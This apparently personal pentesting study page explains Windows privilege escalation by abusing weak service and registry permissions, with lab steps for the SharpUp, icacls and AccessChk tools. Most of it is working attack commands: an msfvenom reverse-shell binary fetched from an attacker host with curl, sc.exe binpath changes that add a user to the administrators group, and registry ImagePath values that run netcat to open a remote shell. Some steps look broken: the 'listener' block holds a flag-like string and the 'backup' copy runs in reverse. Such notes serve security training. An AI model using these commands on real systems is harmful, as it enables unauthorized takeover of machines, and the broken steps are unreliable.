---
title: Windows- Abusing weak permissions
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - pentesting
  - windows
  - privilege
---
# Windows: Abusing weak permissions

## Permissive File System ACLs

### Running SharpUp

We can use [SharpUp](sharpup.md) from the GhostPack suite of tools to check for service binaries suffering from weak ACLs.

```powershell
.\SharpUp.exe audit
```

In the example, the tool identifies the `PC Security Management Service`, which executes the `SecurityService.exe` binary when started.

### Checking Permissions with icacls

Using icacls we can verify the vulnerability and see that the EVERYONE and BUILTIN\Users groups have been granted full permissions to the directory, and therefore any unprivileged system user can manipulate the directory and its contents.

```powershell
icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"
```

Output:

```
C:\Program Files (x86)\PCProtect\SecurityService.exe BUILTIN\Users:(I)(F)
                                                     Everyone:(I)(F)
                                                     NT AUTHORITY\SYSTEM:(I)(F)
                                                     BUILTIN\Administrators:(I)(F)
                                                     APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                                     APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
```


### Replacing Service Binary

This service is also startable by unprivileged users. 

We will:

1. make a backup of the original binary
2. Create a malicious binary with msfvenom
3. Download it in the target host and replace the original
4. Set a listener
5. Establish the connection

We can make a backup of the original binary: 

```cmd-session
cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"
```

Create  a malicious binary generated with `msfvenom` in out attacking machine:

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.158 LPORT=8443 -f exe > SecurityService.exe
```

Serve the malicious file:

```
python3 -m http.server 8080
```

Download it from the target host to the needed location:

```
curl http://10.10.14.158:8080/SecurityService.exe -O "C:\Program Files (x86)\PCProtect\SecurityService.exe"
```

Set a listener:

```bash
Aud1t_th0se_s3rv1ce_p3rms!
```


Launch the service and get a reverse shell: 

```powershell
sc.exe start SecurityService
```


## Permission with AccessChk

### Running SharpUp

We can use [SharpUp](sharpup.md) from the GhostPack suite of tools to check for service binaries suffering from weak ACLs.

```powershell
.\SharpUp.exe audit
```

In the example, the tool identifies the `WindscribeService`, which is running  the `C:\Program Files (x86)\Windscribe\WindscribeService.exe` binary. 

### Checking Permissions with AccessChk

Next, we'll use [AccessChk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk) from the Sysinternals suite to enumerate permissions on the service. The flags we use, in order, are `-q` (omit banner), `-u` (suppress errors), `-v` (verbose), `-c` (specify name of a Windows service), and `-w` (show only objects that have write access). 

```powershell
accesschk.exe /accepteula -quvcw WindscribeService
```

Output:

```
WindscribeService
  Medium Mandatory Level (Default) [No-Write-Up]
  RW NT AUTHORITY\SYSTEM
        SERVICE_ALL_ACCESS
  RW BUILTIN\Administrators
        SERVICE_ALL_ACCESS
  RW NT AUTHORITY\Authenticated Users
        SERVICE_ALL_ACCESS
```

Here we can see that all Authenticated Users have [SERVICE_ALL_ACCESS](https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) rights over the service, which means full read/write control over it.

### Changing the Service Binary Path

Checking the local administrators group confirms that our user htb-student is not a member.

```powershell
net localgroup administrators
```

Let's change it to add our user to the local administrator group. We could set the binary path to run any command or executable of our choosing (such as a reverse shell binary).

```powershell
sc.exe config WindscribeService binpath="cmd /c net localgroup administrators htb-student /add"
```


### Restarting the Service

Next, we must stop the service, so the new binpath command will run the next time it is started.

```powershell
sc.exe stop WindscribeService
sc.exe start WindscribeService
```
 
Now we can confirm that our user htb-student is  a member of the Administrator group:

```powershell
net localgroup administrators
```

### Cleanup: Reverting the Binary Path

```powershell
sc.exe config WindScribeService binpath="c:\Program Files (x86)\Windscribe\WindscribeService.exe"
```

Starting the Service Again: 

```powershell
sc.exe start WindScribeService
```

Verifying Service is Running: 

```powershell
sc.exe query WindScribeService
```


## Windows Update Orchestrator Service (UsoSVC)

Another notable example is the Windows [Update Orchestrator Service (UsoSvc)](https://docs.microsoft.com/en-us/windows/deployment/update/how-windows-update-works), which is responsible for downloading and installing operating system updates. It is considered an essential Windows service and cannot be removed. Since it is responsible for making changes to the operating system through the installation of security and feature updates, it runs as the all-powerful `NT AUTHORITY\SYSTEM` account.

Before installing the security patch relating to [CVE-2019-1322](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-1322), it was possible to elevate privileges from a service account to `SYSTEM`. This was due to weak permissions, which allowed service accounts to modify the service binary path and start/stop the service.


## Unquoted Service Path

When a service is installed, the registry configuration specifies a path to the binary that should be executed on service start. If this binary is not encapsulated within quotes, Windows will attempt to locate the binary in different folders. 

Querying the service `SystemExplorerHelpService`:

```powershell
sc.exe qc SystemExplorerHelpService
```

Output:

```
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: SystemExplorerHelpService
        TYPE               : 20  WIN32_SHARE_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : System Explorer Service
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
```

If we note the Binary Path: 

```
C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe
```

Windows will decide the execution method of a program based on its file extension, so it's not necessary to specify it. Windows will attempt to load the following potential executables in order on service start, with a .exe being implied:

- `C:\Program`
- `C:\Program Files`
- `C:\Program Files (x86)\System`
- `C:\Program Files (x86)\System Explorer\service\SystemExplorerService64`

 Although it's not uncommon to find applications with unquoted service paths, it isn't often exploitable because we need permissions to write to those folders, or permissions to restart the service. 

### Searching for Unquoted Service Paths

In a cmd session:

```cmd-session
wmic service get name,displayname,pathname,startmode |findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
```

If we find any, we could include a malicious file created with msfvenom that is named after the binary.

## Permissive Registry ACLs

It is also worth searching for weak service ACLs in the Windows Registry. We can do this using `accesschk`.  Checking for Weak Service ACLs in Registry:

```cmd-session
accesschk.exe /accepteula "mrb3n" -kvuqsw hklm\System\CurrentControlSet\services
```

|Part|Meaning|
|---|---|
|`accesschk.exe`|[Sysinternals tool](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk) to view security permissions (on files, registry keys, services, etc.)|
|`/accepteula`|Silently accepts the license agreement (avoids GUI popup)|
|`"mrb3n"`|The user account whose permissions you want to check|
|`-k`|Tells AccessChk to target **registry keys**|
|`-v`|Show **verbose** output (includes more details)|
|`-u`|Show permissions that apply to the **specified user** (i.e., `mrb3n`)|
|`-q`|Quiet — suppresses errors like “access denied”|
|`-s`|**Recurse** subkeys (goes deep into nested keys)|
|`-w`|Show only **keys that are writable** by the user|
|`hklm\System\CurrentControlSet\services`|The registry path being checked — where Windows service configurations live|

Basically, this command will recursively scan all subkeys under `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services`.  For each key, it checks if the user `mrb3n` has write permissions.

If `mrb3n` has write access to a service registry key, you can often:

- Hijack the service (change `ImagePath`, `binPath`, etc.)
- Get privilege escalation, especially if the service runs as SYSTEM
- Combine with service restart or reboot to trigger code execution

Above, find the change the binary path. Also let's understand the difference:

**binPath vs. ImagePath**

| Term                    | Where it's used                                                               | Meaning                                                      |
| ----------------------- | ----------------------------------------------------------------------------- | ------------------------------------------------------------ |
| `ImagePath`             | **Registry** value under `HKLM\SYSTEM\CurrentControlSet\Services\YourService` | Path to the executable that gets run when the service starts |
| `binPath` or `binPath=` | **Used in command-line tools** like `sc.exe`                                  | Argument that sets or shows the `ImagePath` for a service    |


- `ImagePath` is the actual registry value name    
- `binPath=` is just **how it's referred to in commands**


### Changing ImagePath with PowerShell

The `ImagePath` is a registry value under each service’s key that tells Windows what binary or command to execute when starting the service.

We can abuse this using the PowerShell cmdlet `Set-ItemProperty` to change the `ImagePath` value, using a command such as:

```powershell
Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name "ImagePath" -Value "C:\Tools\nc64.exe -e cmd.exe 10.10.14.158 8443"

Set-ItemProperty -Path HKLM:\System\CurrentControlSet\services\TrkWks -Name "ImagePath" -Value "C:\Tools\nc64.exe -e cmd.exe 10.10.14.158 8443"

```


## Modifiable Registry Autorun Binary

### Check Startup Programs

We can use WMIC to see what programs run at system startup.

```powershell
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User |fl
```

 Suppose we have write permissions to the registry for a given binary or can overwrite a binary listed. In that case, we may be able to escalate privileges to another user the next time that the user logs in.

This [post](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries.html) and [this site](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2) detail many potential autorun locations on Windows systems.

